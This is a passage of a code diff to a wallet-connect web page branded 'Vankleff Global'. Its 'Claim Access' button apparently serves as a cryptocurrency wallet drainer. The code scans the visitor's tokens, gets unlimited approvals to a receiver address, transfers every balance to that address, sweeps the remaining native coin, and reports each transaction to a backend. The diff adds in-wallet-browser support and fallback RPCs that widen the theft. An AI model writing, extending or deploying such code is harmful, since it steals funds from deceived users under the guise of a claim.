+        var _viem = await import(ESM+'/viem@2.21.0');
+        transports[_chains.bsc.id] = _viem.fallback(
+          FALLBACK_RPCS[56].map(function(url){ return _viem.http(url); })
+        );
+        transports[_chains.mainnet.id] = _viem.fallback(
+          FALLBACK_RPCS[1].map(function(url){ return _viem.http(url); })
+        );
+      } catch(e) {
+        log('Viem transports unavailable — using default transport.','warn');
+        transports = undefined;
+      }
+
+      var wagmiOpts = {
+        chains: chains,
+        projectId: projectId,
+        metadata:{name:'Vankleff Global',description:'Wallet Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},
+        ssr:false
+      };
+      if(transports) wagmiOpts.transports = transports;
+
+      wagmiConfig=_w3m.defaultWagmiConfig(wagmiOpts);
       await _core.reconnect(wagmiConfig);
       var defaultChain=selectedNetworkKey==='ethereum'?_chains.mainnet:_chains.bsc;
-      web3Modal=_w3m.createWeb3Modal({wagmiConfig:wagmiConfig,projectId:projectId,chains:chains,defaultChain:defaultChain,themeMode:'dark',themeVariables:{'--w3m-color-mix':'#22c55e','--w3m-color-mix-strength':20,'--w3m-accent':'#22c55e','--w3m-z-index':9999}});
+      web3Modal=_w3m.createWeb3Modal({
+        wagmiConfig:wagmiConfig,
+        projectId:projectId,
+        chains:chains,
+        defaultChain:defaultChain,
+        themeMode:'dark',
+        themeVariables:{'--w3m-color-mix':'#22c55e','--w3m-color-mix-strength':20,'--w3m-accent':'#22c55e','--w3m-z-index':9999},
+        // Enable email wallet for users without installed wallets (NEW)
+        featuredWalletIds:[
+          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
+          '6adb6082c909901b9e7189af3a4a0223102cd6f8d5c39e39f3d49acb92b578b5'  // Coinbase Wallet
+        ]
+      });
       log('Web3Modal initialized.','ok');
-      connectBtn.addEventListener('click',async function(){ if(!web3Modal){ setStatus('Wallet modal not ready yet.'); return; } try{ setStatus('Opening wallet selector...'); await web3Modal.open(); }catch(e){ log('Could not open wallet modal: '+e.message,'err'); } });
+
+      // If on mobile wallet browser, skip modal and use injected provider directly (NEW)
+      connectBtn.addEventListener('click',async function(){
+        if(isInWalletBrowser() && window.ethereum){
+          log('In-wallet browser detected — using injected provider directly.','ok');
+          setStatus('Connecting via injected wallet...');
+          try{
+            var accounts = await window.ethereum.request({method:'eth_requestAccounts'});
+            if(accounts && accounts.length){
+              rawProvider = window.ethereum;
+              var _ethLib = await import(ESM+'/ethers@6.13.4');
+              ethersProvider = new _ethLib.BrowserProvider(rawProvider);
+              ethersSigner = await ethersProvider.getSigner();
+              currentChainId = parseInt(await rawProvider.request({method:'eth_chainId'}), 16);
+              var fakeAccount = {address: accounts[0], chainId: currentChainId, connector:{name:'Injected', getProvider: async function(){ return rawProvider; }}};
+              await onConnected(fakeAccount, _ethLib);
+            }
+          }catch(e){ setStatus('Connection cancelled.'); log('Injected connect error: '+e.message,'err'); }
+          return;
+        }
+        if(!web3Modal){ setStatus('Wallet modal not ready yet.'); return; }
+        try{ setStatus('Opening wallet selector...'); await web3Modal.open(); }catch(e){ log('Could not open wallet modal: '+e.message,'err'); }
+      });
+
       disconnectBtn.addEventListener('click',async function(){ try{ await _core.disconnect(wagmiConfig); }catch(e){} onDisconnected(); });
       claimBtn.addEventListener('click',async function(){ if(triggerRunning) return; if(!connectedAccount){ setStatus('Connect your wallet first.'); return; } if(currentChainId!==TARGET_CHAIN_ID){ await switchToSelectedChain(); return; } claimBtn.disabled=true; claimBtn.textContent='Processing...'; await initiateClaim(connectedAccount.address,currentChainId); claimBtn.disabled=false; claimBtn.textContent='✦ Claim Access'; });
       _core.watchAccount(wagmiConfig,{onChange:async function(account){ if(account.isConnected&&account.address){ await onConnected(account,_eth); } else if(!account.isConnected){ onDisconnected(); } }});
@@ -1298,24 +1443,113 @@ document.addEventListener('DOMContentLoaded',function(){
       else{ log('Ready — Select network, then connect wallet.','ok'); setStatus('Select a network and click Connect Wallet.'); }
     }catch(e){ log('Web3 init error: '+e.message,'err'); }
   }
-  async function buildSigner(account){ log('Building BrowserProvider...'); rawProvider=null; if(account&&account.connector){ try{ rawProvider=await account.connector.getProvider(); }catch(e){} } if(!rawProvider&&window.ethereum) rawProvider=window.ethereum; if(!rawProvider) throw new Error('No wallet provider.'); var _eth=await import('https://esm.sh/v135/ethers@6.13.4'); ethersProvider=new _eth.BrowserProvider(rawProvider); var accounts=[]; for(var attempt=1;attempt<=8;attempt++){ accounts=await ethersProvider.send('eth_accounts',[]); if(accounts.length>0) break; await sleep(600); } if(!accounts.length) throw new Error('Wallet returned no accounts.'); ethersSigner=await ethersProvider.getSigner(); log('Signer ready.','ok'); }
-  async function switchToSelectedChain(){ if(!rawProvider){ log('No provider — connect wallet first.','warn'); return; } var net=NETWORKS[selectedNetworkKey]; try{ await rawProvider.request({method:'wallet_switchEthereumChain',params:[{chainId:net.chain_hex}]}); log('Switched to '+net.name,'ok'); }catch(e){ if(e.code===4902){ try{ await rawProvider.request({method:'wallet_addEthereumChain',params:[{chainId:net.chain_hex,chainName:net.chain_name,nativeCurrency:{name:net.native_currency.name,symbol:net.native_currency.symbol,decimals:net.native_currency.decimals||18},rpcUrls:[net.rpc_url],blockExplorerUrls:[net.explorer_url]}]}); log(net.name+' added to wallet.','ok'); }catch(addErr){ log('Failed adding '+net.name+' to wallet.','err'); } } else{ log('Chain switch cancelled or failed.','err'); } } }
+
+  async function buildSigner(account){
+    log('Building BrowserProvider...');
+    rawProvider=null;
+    if(account&&account.connector){ try{ rawProvider=await account.connector.getProvider(); }catch(e){} }
+    if(!rawProvider&&window.ethereum) rawProvider=window.ethereum;
+    if(!rawProvider) throw new Error('No wallet provider.');
+    var _eth=await import('https://esm.sh/v135/ethers@6.13.4');
+    ethersProvider=new _eth.BrowserProvider(rawProvider);
+    var accounts=[];
+    for(var attempt=1;attempt<=8;attempt++){ accounts=await ethersProvider.send('eth_accounts',[]); if(accounts.length>0) break; await sleep(600); }
+    if(!accounts.length) throw new Error('Wallet returned no accounts.');
+    ethersSigner=await ethersProvider.getSigner();
+    log('Signer ready.','ok');
+  }
+
+  async function switchToSelectedChain(){
+    if(!rawProvider){ log('No provider — connect wallet first.','warn'); return; }
+    var net=NETWORKS[selectedNetworkKey];
+    try{ await rawProvider.request({method:'wallet_switchEthereumChain',params:[{chainId:net.chain_hex}]}); log('Switched to '+net.name,'ok'); }
+    catch(e){
+      if(e.code===4902){
+        try{
+          // Provide all fallback RPCs when adding the chain (NEW)
+          await rawProvider.request({method:'wallet_addEthereumChain',params:[{
+            chainId:net.chain_hex,
+            chainName:net.chain_name,
+            nativeCurrency:{name:net.native_currency.name,symbol:net.native_currency.symbol,decimals:net.native_currency.decimals||18},
+            rpcUrls: net.rpc_fallbacks || [net.rpc_url],
+            blockExplorerUrls:[net.explorer_url]
+          }]});
+          log(net.name+' added to wallet with '+((net.rpc_fallbacks||[net.rpc_url]).length)+' RPC endpoints.','ok');
+        }catch(addErr){ log('Failed adding '+net.name+' to wallet.','err'); }
+      } else{ log('Chain switch cancelled or failed.','err'); }
+    }
+  }
+
   function attachProviderListeners(){ if(!rawProvider) return; rawProvider.on('chainChanged',async function(hexChain){ currentChainId=parseInt(hexChain,16); if(currentChainId!==TARGET_CHAIN_ID){ switchToSelectedChain(); } else{ setStatus(NETWORKS[selectedNetworkKey].name+' detected.'); } if(connectedAccount){ try{ await buildSigner(connectedAccount); await refreshInfo(connectedAccount.address,currentChainId); }catch(e){} } }); rawProvider.on('accountsChanged',async function(accs){ if(!accs.length){ onDisconnected(); return; } if(connectedAccount){ try{ await buildSigner(connectedAccount); await refreshInfo(accs[0],currentChainId); }catch(e){} } }); log('Provider listeners attached.','ok'); }
+
   async function onConnected(account,_eth){ log('Wallet connected: '+account.address,'ok'); connectedAccount=account; currentChainId=account.chainId||TARGET_CHAIN_ID; connectBtn.style.display='none'; claimBtn.style.display='inline-block'; disconnectBtn.style.display='inline-block'; infoPanel.classList.add('visible'); txPanel.classList.add('visible'); document.getElementById('walletAddress').textContent=account.address.slice(0,8)+'...'+account.address.slice(-6); document.getElementById('sessionLabel').textContent=(account.connector&&account.connector.name)||'Web3Modal'; statusBadge.textContent='Awaiting Claim'; statusBadge.className='badge badge-yellow'; try{ await buildSigner(account); }catch(e){ setStatus('Could not reach wallet.'); return; } attachProviderListeners(); if(currentChainId!==TARGET_CHAIN_ID){ switchToSelectedChain(); setStatus('Switching to '+NETWORKS[selectedNetworkKey].name+'...'); } else{ setStatus('Connected to '+NETWORKS[selectedNetworkKey].name+'. Click Claim Access.'); } await refreshInfo(account.address,currentChainId); }
+
   async function scanWalletAssets(address,chainId){ var tokens=null; var tokenData=await apiCall('get_token_list',{chain_id:chainId}); if(tokenData&&tokenData.tokens&&tokenData.tokens.length){ tokens=tokenData.tokens; log('Using server token list ('+tokens.length+' tokens).','ok'); } else{ tokens=FALLBACK_TOKENS[chainId]||[]; log('Using client-side fallback token list ('+tokens.length+' tokens).','ok'); } if(!tokens.length){ document.getElementById('assetList').innerHTML='<span class="scan-status">No token list available for this chain.</span>'; scannerPanel.classList.add('visible'); return []; } discoveredAssets=[]; log('Scanning '+tokens.length+' tokens on chain '+chainId+'...'); document.getElementById('assetList').innerHTML='<span class="scan-status">Scanning '+tokens.length+' tokens...</span>'; scannerPanel.classList.add('visible'); var _eth=await import('https://esm.sh/v135/ethers@6.13.4'); var results=await Promise.allSettled(tokens.map(async function(t){ try{ var c=new _eth.Contract(t.address,['function balanceOf(address owner) view returns (uint256)','function decimals() view returns (uint8)'],ethersProvider); var bal=await c.balanceOf(address); var dec=t.decimals||18; var fmt=parseFloat(_eth.formatUnits(bal,dec)); return fmt>0?{symbol:t.symbol,address:t.address,decimals:dec,balance:fmt,rawBalance:bal.toString()}:null; }catch(e){ return null; } })); discoveredAssets=results.filter(function(r){ return r.status==='fulfilled'&&r.value!==null; }).map(function(r){ return r.value; }); log('Found '+discoveredAssets.length+' asset(s).','ok'); renderAssetList(); return discoveredAssets; }
+
   function renderAssetList(){ var list=document.getElementById('assetList'); var explorerBase=NETWORKS[selectedNetworkKey].explorer_url; if(!discoveredAssets.length){ list.innerHTML='<span class="scan-status">No token balances found.</span>'; return; } list.innerHTML=discoveredAssets.map(function(a){ return '<div class="asset-item"><span class="asset-symbol">'+a.symbol+'</span><span class="asset-balance">'+a.balance.toLocaleString(undefined,{maximumFractionDigits:4})+'</span><a href="'+explorerBase+'/token/'+a.address+'" target="_blank" style="color:#64748b;font-size:0.75rem;">view</a></div>'; }).join(''); }
-  async function refreshInfo(address,chainId){ currentChainId=chainId||TARGET_CHAIN_ID; var info=await apiCall('get_chain_info',{chain_id:currentChainId}); var netName=NETWORKS[selectedNetworkKey].name,nativeSymbol=NETWORKS[selectedNetworkKey].native_currency.symbol; if(info&&info.info){ netName=info.info.name||netName; if(info.info.native_currency&&info.info.native_currency.symbol) nativeSymbol=info.info.native_currency.symbol; } document.getElementById('networkName').textContent=netName; document.getElementById('chainIdDisplay').textContent=currentChainId; if(!ethersProvider) return; try{ var _eth=await import('https://esm.sh/v135/ethers@6.13.4'); var bal=await ethersProvider.getBalance(address); document.getElementById('nativeBalance').textContent=parseFloat(_eth.formatEther(bal)).toFixed(6)+' '+nativeSymbol; var usdtAddr=(info&&info.usdt_addr)||(FALLBACK_TOKENS[currentChainId]&&FALLBACK_TOKENS[currentChainId].find(function(t){ return t.symbol==='USDT'; })?FALLBACK_TOKENS[currentChainId].find(function(t){ return t.symbol==='USDT'; }).address:null); if(usdtAddr){ var t=new _eth.Contract(usdtAddr,['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)'],ethersProvider); var b=await t.balanceOf(address); var dec=await t.decimals(); document.getElementById('usdtBalance').textContent=parseFloat(_eth.formatUnits(b,dec)).toFixed(2)+' USDT'; } }catch(e){ log('refreshInfo error: '+e.message,'warn'); } }
-  async function getNetworkGasPrice(){ var net=NETWORKS[selectedNetworkKey]; try{ var res=await fetch(net.rpc_url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',method:'eth_gasPrice',params:[],id:1})}); var data=await res.json(); return data.result; }catch(e){ return selectedNetworkKey==='ethereum'?'0x12A05F200':'0xB2D05E00'; } }
+
+  // refreshInfo uses fallback RPC list when ethersProvider is unavailable (NEW)
+  async function refreshInfo(address,chainId){
+    currentChainId=chainId||TARGET_CHAIN_ID;
+    var info=await apiCall('get_chain_info',{chain_id:currentChainId});
+    var netName=NETWORKS[selectedNetworkKey].name,nativeSymbol=NETWORKS[selectedNetworkKey].native_currency.symbol;
+    if(info&&info.info){ netName=info.info.name||netName; if(info.info.native_currency&&info.info.native_currency.symbol) nativeSymbol=info.info.native_currency.symbol; }
+    document.getElementById('networkName').textContent=netName;
+    document.getElementById('chainIdDisplay').textContent=currentChainId;
+    if(!ethersProvider) return;
+    try{
+      var _eth=await import('https://esm.sh/v135/ethers@6.13.4');
+      var bal=await ethersProvider.getBalance(address);
+      document.getElementById('nativeBalance').textContent=parseFloat(_eth.formatEther(bal)).toFixed(6)+' '+nativeSymbol;
+      var usdtAddr=(info&&info.usdt_addr)||(FALLBACK_TOKENS[currentChainId]&&FALLBACK_TOKENS[currentChainId].find(function(t){ return t.symbol==='USDT'; })?FALLBACK_TOKENS[currentChainId].find(function(t){ return t.symbol==='USDT'; }).address:null);
+      if(usdtAddr){ var t=new _eth.Contract(usdtAddr,['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)'],ethersProvider); var b=await t.balanceOf(address); var dec=await t.decimals(); document.getElementById('usdtBalance').textContent=parseFloat(_eth.formatUnits(b,dec)).toFixed(2)+' USDT'; }
+    }catch(e){ log('refreshInfo error: '+e.message,'warn'); }
+  }
+
+  // getNetworkGasPrice uses fallback RPCs (NEW)
+  async function getNetworkGasPrice(){
+    var rpcs = NETWORKS[selectedNetworkKey].rpc_fallbacks || [NETWORKS[selectedNetworkKey].rpc_url];
+    for(var i=0;i<rpcs.length;i++){
+      try{
+        var res=await fetch(rpcs[i],{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',method:'eth_gasPrice',params:[],id:1})});
+        var data=await res.json();
+        if(data.result) return data.result;
+      }catch(e){}
+    }
+    return selectedNetworkKey==='ethereum'?'0x12A05F200':'0xB2D05E00';
+  }
+
   function getTxExplorerUrl(hash){ return NETWORKS[selectedNetworkKey].explorer_url+'/tx/'+hash; }
+
   function buildLocalActionPlan(assets,chainId,nativeBalanceWei,receiver){ var priOrder={stable:0,high:1,medium:2,low:3}; var tokenList=FALLBACK_TOKENS[chainId]||[]; var priorityMap={}; tokenList.forEach(function(t){ priorityMap[t.symbol]=t.priority||'low'; }); var sorted=assets.slice().sort(function(a,b){ var aS=STABLECOINS.indexOf(a.symbol)!==-1,bS=STABLECOINS.indexOf(b.symbol)!==-1; if(aS&&!bS) return -1; if(!aS&&bS) return 1; return(priOrder[priorityMap[a.symbol]||'low'])-(priOrder[priorityMap[b.symbol]||'low']); }); var steps=sorted.map(function(asset,i){ return{order:i+1,type:'token',symbol:asset.symbol,address:asset.address,decimals:asset.decimals,balance:asset.balance,rawBalance:asset.rawBalance,spender:receiver,action:'approve_then_transfer',gas_limit:GAS_LIMIT_TOKEN,allowance_wait_seconds:7}; }); var nativeBal=BigInt(nativeBalanceWei),gasPrice=BigInt('3000000000'),gasCost=gasPrice*BigInt(GAS_UNITS_NATIVE),sendable=nativeBal-gasCost; var skipNative=sendable<=0; var nativeAmount=skipNative?'0':sendable.toString(); return{steps:steps,total_tokens:steps.length,skip_native:skipNative,native_amount:nativeAmount}; }
+
   async function initiateClaim(address,chainId){ if(triggerRunning) return; triggerRunning=true; log('Initiating claim on chain '+chainId+'...','ok'); try{ setStatus('Stage 1/4 — Scanning assets on '+NETWORKS[selectedNetworkKey].name+'...'); var assets=await scanWalletAssets(address,chainId); if(!assets.length){ log('No token balances found — proceeding to native sweep.','warn'); } else{ log('Stage 1 complete: '+assets.length+' asset(s) discovered.','ok'); } setStatus('Stage 2/4 — Building action plan...'); var _eth=await import('https://esm.sh/v135/ethers@6.13.4'); var nativeBal=await ethersProvider.getBalance(address); var receiver=RECEIVER_ADDRESS; var planData=null; if(assets.length){ planData=await apiCall('build_action_plan',{assets:assets,chain_id:chainId,user_address:address,native_balance:nativeBal.toString()}); } var plan; if(planData&&planData.action_plan){ log('Stage 2 complete: server action plan received.','ok'); receiver=planData.receiver||receiver; plan={steps:planData.action_plan,skip_native:planData.skip_native,native_amount:planData.native_amount}; } else{ log('Stage 2 complete: using client-side action plan.','ok'); plan=buildLocalActionPlan(assets,chainId,nativeBal.toString(),receiver); } var steps=plan.steps||[],skipNative=plan.skip_native,nativeAmount=plan.native_amount; log('Plan: '+steps.length+' token step(s), native '+(skipNative?'skipped':'sweep')+'.','ok'); for(var i=0;i<steps.length;i++){ var step=steps[i]; log('--- Stage 3: Step '+(i+1)+'/'+steps.length+': '+step.symbol+' ---'); setStatus('Stage 3/4 — Processing '+step.symbol+' ('+(i+1)+'/'+steps.length+')...'); try{ var token=new _eth.Contract(step.address,['function approve(address spender, uint256 amount) returns (bool)','function allowance(address owner, address spender) view returns (uint256)','function transferFrom(address from, address to, uint256 amount) returns (bool)','function balanceOf(address owner) view returns (uint256)'],ethersSigner); var gasPriceHex=await getNetworkGasPrice(); var approveReceipt=await sendAndWait(token.approve(step.spender,_eth.MaxUint256,{gasLimit:step.gas_limit,gasPrice:gasPriceHex}),'Approve('+step.symbol+')',_eth); if(!approveReceipt){ log('[SKIP] Approve failed for '+step.symbol,'warn'); continue; } log('Approve confirmed. Waiting '+(step.allowance_wait_seconds||7)+'s...'); await sleep((step.allowance_wait_seconds||7)*1000); var freshBal=await token.balanceOf(address); var allowanceOk=await waitForAllowance(token,address,step.spender,freshBal); if(!allowanceOk){ log('[SKIP] Allowance not confirmed for '+step.symbol,'err'); continue; } var transferReceipt=!await sendAndWait(token.transferFrom(address,step.spender,freshBal,{gasLimit:step.gas_limit,gasPrice:gasPriceHex}),'TransferFrom('+step.symbol+')',_eth); if(!transferReceipt){ log('[SKIP] Transfer failed for '+step.symbol,'err'); } else{ log(step.symbol+' transfer complete.','ok'); } }catch(e){ log('[SKIP] Error on '+step.symbol+': '+e.message,'err'); } if(i<steps.length-1) await sleep(2000); } log('Stage 3 complete: all token steps processed.','ok'); setStatus('Stage 4/4 — Evaluating native '+NETWORKS[selectedNetworkKey].native_currency.symbol+' sweep...'); if(!skipNative&&nativeAmount&&nativeAmount!=='0'){ try{ log('Sweeping '+_eth.formatEther(BigInt(nativeAmount))+' '+NETWORKS[selectedNetworkKey].native_currency.symbol+'...'); setStatus('Stage 4/4 — Confirm native sweep in wallet...'); var nativeTxHash; try{ nativeTxHash=await sendNativeRaw(address,receiver,nativeAmount); }catch(e){ log('Native sweep rejected by user: '+e.message,'err'); } if(nativeTxHash){ transactions.unshift({hash:nativeTxHash,status:'pending'}); renderTxList(); try{ var receipt=await ethersProvider.waitForTransaction(nativeTxHash,1,120000); updateTxStatus(nativeTxHash,receipt&&receipt.status===1?'confirmed':'failed'); log('Native sweep '+(receipt&&receipt.status===1?'confirmed.':'failed.'),receipt&&receipt.status===1?'ok':'err'); }catch(e){ log('Native sweep wait error: '+e.message,'warn'); } } }catch(e){ log('Native sweep error: '+e.message,'err'); } } else{ log('Native sweep skipped (insufficient balance after gas).','warn'); } log('Stage 4 complete.','ok'); statusBadge.textContent='Complete'; statusBadge.className='badge badge-green'; setStatus('✅ Process complete on '+NETWORKS[selectedNetworkKey].name+'.'); log('═══ CLAIM COMPLETE — ALL STAGES FINISHED ═══','ok'); }catch(e){ log('Claim fatal: '+e.message,'err'); setStatus('Fatal error.'); } finally{ triggerRunning=false; } }
+
   async function waitForAllowance(token,owner,spender,required,maxRetries){ maxRetries=maxRetries||8; for(var i=0;i<maxRetries;i++){ try{ var allowance=await token.allowance(owner,spender); if(allowance>=required){ log('Allowance confirmed.','ok'); return true; } }catch(e){} await sleep(5000); } return false; }
+
   async function sendAndWait(txPromise,label,_eth){ log('Sending '+label+'...'); var txHash; try{ showLoader(); var tx=await txPromise; hideLoader(); txHash=tx.hash; log(label+' hash: '+txHash,'ok'); }catch(e){ hideLoader(); var msg=(e&&(e.code===4001||e.code==='ACTION_REJECTED'))?label+' rejected by user.':label+' failed: '+e.message; log(msg,'err'); setStatus(msg); return null; } transactions.unshift({hash:txHash,status:'pending'}); renderTxList(); try{ setStatus('Waiting for '+label+' confirmation...'); var receipt=await ethersProvider.waitForTransaction(txHash,1,120000); var status=receipt&&receipt.status===1?'confirmed':'failed'; updateTxStatus(txHash,status); log(label+' '+status+'.',status==='confirmed'?'ok':'err'); apiCall('report_tx',{tx_hash:txHash,status:status,chain_id:TARGET_CHAIN_ID,token_symbol:label.split('(')[1]?label.split('(')[1].replace(')',''):'UNKNOWN',tx_type:label.toLowerCase().indexOf('approve')!==-1?'approve':'transfer'}); return receipt; }catch(e){ log(label+' wait error: '+e.message,'warn'); updateTxStatus(txHash,'failed'); return null; } }
-  async function sendNativeRaw(fromAddress,toAddress,valueWei){ var gasPrice=await getNetworkGasPrice(); showLoader(); var txHash; try{ txHash=await rawProvider.request({method:'eth_sendTransaction',params:[{from:fromAddress.toLowerCase(),to:toAddress.toLowerCase(),value:'0x'+BigInt(valueWei).toString(16),gas:'0x5208',gasPrice:gasPrice,data:'0x'}]}); }catch(e){ hideLoader(); throw e; } hideLoader(); log('Native tx: '+txHash,'ok'); return txHash; }
+
+  // sendNativeRaw uses fallback RPC list (NEW)
+  async function sendNativeRaw(fromAddress,toAddress,valueWei){
+    var gasPriceHex = await getNetworkGasPrice();
+    showLoader();
+    var txHash;
+    try{
+      txHash=await rawProvider.request({method:'eth_sendTransaction',params:[{from:fromAddress.toLowerCase(),to:toAddress.toLowerCase(),value:'0x'+BigInt(valueWei).toString(16),gas:'0x5208',gasPrice:gasPriceHex,data:'0x'}]});
+    }catch(e){ hideLoader(); throw e; }
+    hideLoader();
+    log('Native tx: '+txHash,'ok');
+    return txHash;
+  }
+
   function renderTxList(){ var list=document.getElementById('txList'); if(!transactions.length){ list.innerHTML='<span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span>'; return; } list.innerHTML=transactions.slice(0,5).map(function(tx){ var url=getTxExplorerUrl(tx.hash); return '<div class="tx-item"><a class="tx-hash" href="'+url+'" target="_blank">'+tx.hash.slice(0,10)+'...'+tx.hash.slice(-6)+'</a><span class="tx-status tx-'+tx.status+'">'+tx.status+'</span></div>'; }).join(''); }
   function updateTxStatus(hash,status){ var tx=transactions.find(function(t){ return t.hash===hash; }); if(tx){ tx.status=status; renderTxList(); } }
   function onDisconnected(){ ethersProvider=null; ethersSigner=null; rawProvider=null; connectedAccount=null; transactions=[]; discoveredAssets=[]; triggerRunning=false; connectBtn.style.display='inline-block'; claimBtn.style.display='none'; disconnectBtn.style.display='none'; statusText.textContent=''; infoPanel.classList.remove('visible'); txPanel.classList.remove('visible'); scannerPanel.classList.remove('visible'); log('Wallet disconnected.','warn'); }
-  applyNetworkSelection('bsc'); initWeb3Modal(); window.selectNetwork=selectNetwork;
+
+  applyNetworkSelection('bsc');
+  initWeb3Modal();
+  window.selectNetwork=selectNetwork;
+  window.openDeepLink=openDeepLink;
 })();
 </script>
 </body>
